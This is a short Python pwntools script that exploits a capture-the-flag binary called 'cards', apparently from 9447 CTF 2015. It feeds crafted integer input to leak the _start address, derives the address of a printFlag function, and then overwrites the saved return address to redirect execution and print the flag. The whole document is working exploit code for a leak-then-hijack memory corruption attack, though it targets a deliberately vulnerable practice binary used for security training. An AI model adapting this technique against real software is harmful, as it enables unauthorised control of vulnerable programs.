from pwn import *
import re, sys
offset_start = 0x000008ea
offset_printflag = 0x00000d90
r = process('./cards')
junk  = r.recvuntil('Enter up to 52 cards (0 to stop):\n')

### ROUND 1 -- Leak _start address to get base address
# Send a 5 sized deck to cause the fifth element to get index -3 and thus swap with address of _start
r.send('-9223372036854775808\n1\n1\n1\n1\n0\n')
junk += r.recvline()
nums = r.recvline()
# Line stolen from http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-cards/ <3
addr_start = list(int(n) for n in nums.split() if n not in ('1', str(-9223372036854775808)))[0]
log.info("round 1: {}".format(nums))
log.info("addr_start: {}".format(hex(addr_start)))
# Calculate printFlag address
addr_printflag = addr_start - offset_start + offset_printflag
log.info("addr_printflag: {}".format(hex(addr_printflag)))
# Send all indexes to get to second round
for i in range(5): r.sendline(str(i))

### ROUND 2 - Overwrite RIP
junk += r.recvuntil('Enter up to 52 cards (0 to stop):\n')
r.send('-9223372036854775808\n{:d}\n1\n1\n1\n1\n1\n0\n'.format(addr_printflag))
flag = r.recvall()
res = re.findall(r'9447{.*}',flag)
if len(res) < 1:
    print 'FAIL!'
    sys.exit(1)
log.info('Flag: {}'.format(res[0]))
